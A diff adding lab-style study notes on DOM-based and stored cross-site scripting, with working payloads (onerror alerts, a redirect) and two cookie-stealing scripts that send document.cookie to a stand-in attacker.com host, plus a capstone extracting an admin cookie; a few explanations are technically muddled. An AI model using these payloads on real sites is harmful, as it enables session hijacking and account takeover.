@@ -586,13 +586,144 @@ rm $url/recon/wayback/extensions/aspx1.txt
 
 2. XSS
 
-It is injecting JS into a webpage. It can be called JaveScript injection.
+It is injecting script (python, javascript, flask...) into a webpage. It can be called scripting injection.
 
-- Reflected XSS
+- DOM-based XSS
 
-- DOM
+A website can be vulnerable to DOM-based XSS when it runs locally without communicating with a server or database. And the website takes the data from an attacker-controllable source, such as the URL, and does not properly sanitized the user input into the DOM. So it allows attacker to execute malicious code and hijack other user's account.
 
-- Stored
+Testing for DOM-based cross-site scripting vulnerability
+
+When I add "hello" there is no `POST` or `PUT` event because this website is running locally and is based on the DOM. As a result, it can be vulnerable to DOM-based vulnerabilities.
+
+![basicXSS](../assets/img/xss/Screenshot%202024-08-02%20at%2014.00.20.png)
+
+I tried to inject the javascript. Even though I could insert this script on the list, but could not execute this script. I needed **a trigger** to make this script execute.
+
+![basicXSS2](../assets/img/xss/Screenshot%202024-08-02%20at%2013.53.51.png)
+
+To make advanced payloads, I used `<img>` scripting.
+
+`<img src=x onerror=alert(1)>`
+
+Instead of inserting image source, `x`can be replaced to show a broken image.
+
+`onerror` is a event handler.
+
+This payload successfully triggered the injected script.
+
+![basicXSS3](../assets/img/xss/Screenshot%202024-08-02%20at%2014.54.08.png)
+
+![basicXSS3-1](../assets/img/xss/Screenshot%202024-08-02%20at%2018.37.35.png)
+
+XSS redirection is dangerous because it leverages the trust users have in a legitimate site to redirect them to malicious sites, leading to various security risks such as phishing, malware distribution, session hijacking, data theft, and browser exploitation. To prevent this attack, developers should validate and sanitize all user input to ensure that no malicious code can be executed.
+
+Once I hit the add with this payload, the redirection was triggered.
+
+`<img src=x onerror=window.location.href='https://www.google.com'>`
+
+![basicXSS4](../assets/img/xss/Screenshot%202024-08-02%20at%2014.59.50.png)
+
+![basicXSS5](../assets/img/xss/Screenshot%202024-08-02%20at%2014.59.59.png)
+
+- Stored XSS
+
+Stored XSS can occur when an application receives data from a database and includes that data in its later HTTP responses without properly sanitizing the user input.
+
+For example, when a website allows users to submit comments on a blog post, attackers can submit a payload, and the payload supplied by the attacker can be executed in the victim's browser. Once the attacker triggers the scripting payload to get the session ID, this ID can be used to impersonate other users.
+
+To test if stored XSS works, I made two containers, one has the cookie value, the other has no cookie value.
+
+In the container1,
+
+![xssStored1](../assets/img/xss/Screenshot%202024-08-04%20at%2011.27.57.png)
+
+![xssStored2](../assets/img/xss/Screenshot%202024-08-04%20at%2011.28.01.png)
+
+In the container2,
+
+![xssStored3](../assets/img/xss/Screenshot%202024-08-04%20at%2011.29.19.png)
+
+To test if stored xss works, I injected HTML tag and scripting payload in the container 1.
+
+![xssTesting1](../assets/img/xss/Screenshot%202024-08-04%20at%2011.30.17.png)
+
+![xssTesting2](../assets/img/xss/Screenshot%202024-08-04%20at%2011.30.30.png)
+
+![xssTesting3](../assets/img/xss/Screenshot%202024-08-04%20at%2011.31.08.png)
+
+![xssTesting4](../assets/img/xss/Screenshot%202024-08-04%20at%2011.31.18.png)
+
+I could see the injected HTML and scripting payload in the container2.
+
+![xssTesting5](../assets/img/xss/Screenshot%202024-08-04%20at%2011.30.46.png)
+
+Refresh the page again, the injected payload was executed in the container 2 too.
+
+![xssTesting6](../assets/img/xss/Screenshot%202024-08-04%20at%2011.31.56.png)
+
+Let's check if the save cookie value from container 1 can be discovered in container 2.
+
+I hit the add with this payload to see cookie value on the alert modal.
+
+![xssExploitation1](../assets/img/xss/Screenshot%202024-08-04%20at%2011.59.42.png)
+
+When I re-visit the container 1, I could see the saved cookie value. Since I saved the cookie value in container 1, I could see the cookie-value there.
+
+![xssExploitation2](../assets/img/xss/Screenshot%202024-08-04%20at%2011.33.04.png)
+
+![xssExploitation3](../assets/img/xss/Screenshot%202024-08-04%20at%2011.33.25.png)
+
+If developer does not secure cookie setting like this.
+
+```javascript
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+That website will be vulnerable to the XSS.
+
+Possible attack scenarios for stored XSS
+
+An attacker injects a malicious script below into a comment field on a website. When a user views the comment, the script executes and sends the user's session cookie to the attacker's server. The attacker then uses the stolen session cookie to impersonate the user and gain unauthorized access to the user's account.
+
+Injectable payload
+
+```javascript
+<script>
+  document.write('
+  <img src="http://attacker.com/steal?cookie=' + document.cookie + '" />
+  ');
+</script>
+```
+
+```javascript
+<script>
+  fetch('http://attacker.com/steal?cookie=' +
+  encodeURIComponent(document.cookie));
+</script>
+```
+
+Capstone,
+
+Let's find the admin cookie value,
+
+Test if the webpage is vulnerable to the stored xss.
+
+`<script>prompt(1)</script>`
+
+![capstoneXSS1](../assets/img/xss/Screenshot%202024-08-04%20at%2015.41.46.png)
+
+![capstoneXSS2](../assets/img/xss/Screenshot%202024-08-04%20at%2015.42.07.png)
+
+It worked well. So I attempted to extract stored cookie.
+
+![capstoneXSS3](../assets/img/xss/Screenshot%202024-08-04%20at%2015.38.08.png)
+
+![capstoneXSS4](../assets/img/xss/Screenshot%202024-08-04%20at%2015.48.38.png)
+
+![capstoneXSS5](../assets/img/xss/Screenshot%202024-08-04%20at%2015.49.12.png)
+
+![capstoneXSS6](../assets/img/xss/Screenshot%202024-08-04%20at%2015.39.09.png)
 
 3. Command injection
 
